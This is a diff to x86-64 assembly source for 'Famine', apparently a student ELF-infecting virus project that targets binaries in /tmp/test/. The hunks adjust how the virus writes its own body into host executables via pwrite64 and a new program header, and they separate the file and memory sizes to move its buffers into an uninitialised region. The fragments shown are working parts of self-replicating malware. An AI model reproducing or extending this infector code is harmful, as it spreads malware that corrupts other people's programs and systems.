@@ -451,8 +451,9 @@ print_rax:
 
 		; write famine
 
+		; 15952 ->21088
 		lea		rsi, [rel _start]
-		mov		rdx, FAMINE_SIZE
+		mov		rdx, FAMINE_SIZE_NO_BSS
 		mov		r10, [rel p_offset]
 		mov		rdi, r12
 		mov		rax, SYS_pwrite64
@@ -762,10 +763,7 @@ end_:
 ; -----
 
 
-	buff	times 4096 db 0
-	newl	times 0001 db 0xa
-	path	db '/tmp/test/', 0
-	padd	times 0512 db 0
+	elfb	times 0064 db 0
 	file	db 'elf64 found!', 0
 	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
 	old_entry		   dq 0
@@ -778,10 +776,7 @@ end_:
 	zero	db 0
 	paddi	dq 0
 	entry	dq 0
-	exec	dw 7
-	elfb	times 0064 db 0
-	elfp0	times 0056 db 0
-	elfp1	times 0056 db 0
+	exec	dd 7
 
 ; NEW HEADER
 new_programheader:
@@ -790,10 +785,15 @@ new_programheader:
 	p_offset	dq	0
 	p_vaddr		dq	0
 	p_paddr		dq	0
-	p_filez		dq	FAMINE_SIZE
+	p_filez		dq	FAMINE_SIZE_NO_BSS
 	p_memsz		dq	FAMINE_SIZE
 	p_palign	dq	4096
-
-
+	newl	times 0001 db 0xa
+	path	db '/tmp/test/', 0
+buffer_bss:
+	padd	times 0512 db 0
+	buff	times 4096 db 0
+	elfp0	times 0056 db 0
+	elfp1	times 0056 db 0
 
 end_addr:
